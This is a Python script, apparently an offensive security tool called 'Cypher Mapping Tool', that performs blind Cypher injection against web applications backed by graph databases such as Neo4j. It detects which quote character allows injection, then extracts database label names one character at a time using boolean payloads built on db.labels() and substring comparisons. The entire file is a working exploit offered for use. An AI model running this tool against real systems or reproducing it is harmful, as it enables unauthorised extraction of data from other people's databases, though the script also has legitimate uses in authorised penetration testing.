#!/usr/bin/env python3.10

import argparse
import urllib.parse
import requests
import random
import sys

ascii_chars='abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'+"'"+'()*+,-./:;<=>?@[\]^`{|}~'

def perform_request(target_url, post_data=False, cookies_dict={}, connection_timeout=5):
    #proxies={}
    proxies={'http':'http://localhost:8080'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'} # Please modify manually if you are sending JSON :)
    try:
        if post_data:
            response = requests.post(target_url, data=post_data, cookies=cookies_dict, timeout=connection_timeout, proxies=proxies, headers=headers)
        else:
            response = requests.get(target_url, cookies=cookies_dict, timeout=connection_timeout,proxies=proxies)

        return response.text

    except requests.exceptions.Timeout:
        return False

def cypher_inject(target_url, payload, post_data=False, cookies_dict={}, connection_timeout=5):
    # Check if '*' is in target_url
    if '*' in target_url:
        encoded_payload = urllib.parse.quote_plus(payload)
        target_url = target_url.replace('*', encoded_payload)
    else:
        # Check if '*' is in post_data
        if post_data and '*' in post_data:
            encoded_payload = urllib.parse.quote_plus(payload)
            post_data = post_data.replace('*', encoded_payload)
        else:
            print("Error: no '*' found in target URL or post data")
            return None
    
    return perform_request(target_url, post_data, cookies_dict, connection_timeout)

def get_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout):
    
    injection_character = "'" 
    injection_characters=[" ", '"', "'"]
   
    for injection_character in injection_characters:
        # Generate random values for the payload
        number1 = random.randint(0, 10000)
        number2 = random.randint(0, 10000)

        # Prepare the payloads for the two requests
        true_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number1)
        false_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number2)

        # Try to inject the payloads using single quotes in target_url and post_data
        try:
            true_result = cypher_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout)
            false_result = cypher_inject(target_url, false_payload, post_data, cookies_dict, connection_timeout)
        except:
            print("Unable to perform cypher injection!!!")
            sys.exit(-1)

        # Check if the blind string is present in the response to the first request but not in the response to the second request
        if blind_string in true_result and blind_string not in false_result:
            return injection_character
    return False

def generate_cookies_dictionary(cookie_string):
    cookie_dict = {}
    if cookie_string:
        cookies = cookie_string.split(';')
        for cookie in cookies:
            name_value = cookie.strip().split('=', 1)
            if len(name_value) == 2:
                cookie_dict[name_value[0]] = name_value[1]
    return cookie_dict

def get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    for number_of_labels in range(0,100,1): # arbitarily set max number or labels to 100 :)
        payload = injection_type + " and count {call db.labels() yield label return label} = " + str(number_of_labels)
        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
        injection_result=cypher_inject(target_url, payload, post_data, cookies_dict, connection_timeout)
        if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
            return number_of_labels
    print("Unable to check number of labels!!!")
    sys.exit(-1)

def get_size_of_label(target_url, label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    for size_of_label in range(0,1000,1): # arbitarily set max size of label to 1000 :)
        payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
        payload+=" limit 1 where size(label) = "+str(size_of_label)+" return label}"
        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
        injection_result=cypher_inject(target_url, payload, post_data, cookies_dict, connection_timeout)
        if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
            return size_of_label
    print(f"Unable to check size of label with index {label_index}!!!")
    sys.exit(-1)

def dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    global ascii_chars
    for label_index in range(0,number_of_labels,1):
        label_size=get_size_of_label(target_url,label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
        print(f"Size of label number {label_index}: {label_size}")
        print("\r"+(80*" ")+f"\rValue of label number {label_index}: ",end='')
        label_value=""
        for character_number in range(0,label_size,1):
            for current_char in ascii_chars:
                if current_char == "'":
                    current_char="\'"
                payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
                payload+=" limit 1 where substring(label," + str(character_number) + ",1) = '"+current_char+"' return label}"
                payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
                injection_result=cypher_inject(target_url, payload, post_data, cookies_dict, connection_timeout)
                if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
                    label_value+=current_char
                    print("\r"+(80*" ")+f"\rValue of label number {label_index}: {label_value}",end='')
                    break
        print("\n")

print('\nCypher Mapping Tool by sectroyer v0.1\n')

try:
    parser = argparse.ArgumentParser(description='Tool for mapping cypher databases (for example neo4j)')
    parser.add_argument('-u', '--url', help='Target URL', required=True)
    parser.add_argument('-d', '--data', help='POST data', default=False)
    parser.add_argument('-c', '--cookie', help='Request cookie', default={})
    parser.add_argument('-s', '--string', help='Blind string')
    parser.add_argument('-t', '--timeout', help='Connection timeout', default=5)
    parser.add_argument('-L', '--labels', help='Dump labels', action='store_true')
    args = parser.parse_args()

    target_url = args.url
    post_data = args.data
    cookies_string = args.cookie
    blind_string = args.string
    connection_timeout = args.timeout

    cookies_dict=generate_cookies_dictionary(cookies_string)

    if "*" not in target_url and (not post_data or "*" not in post_data):
        print("Error: No '*' provided in url or data. Unable to continue...")
        sys.exit(-1)
    if target_url.count('*') > 1 or post_data.count('*') > 1:
        print("More than one '*' provided in url or data. Unable to continue...")
        sys.exit(-1)
    
    injection_type=get_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout)
    if injection_type:
        print(f"Injection type: {injection_type}\n")
    else:
        print("Unable to find valid injection type...\n")
        sys.exit(-1)
    if args.labels:
        print("Dumping labels....\n")
        number_of_labels = get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
        print(f"Number of labels found: {number_of_labels}\n")
        dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout)

    print('')
except SystemExit:
    print('')
    sys.exit()

# Your code here
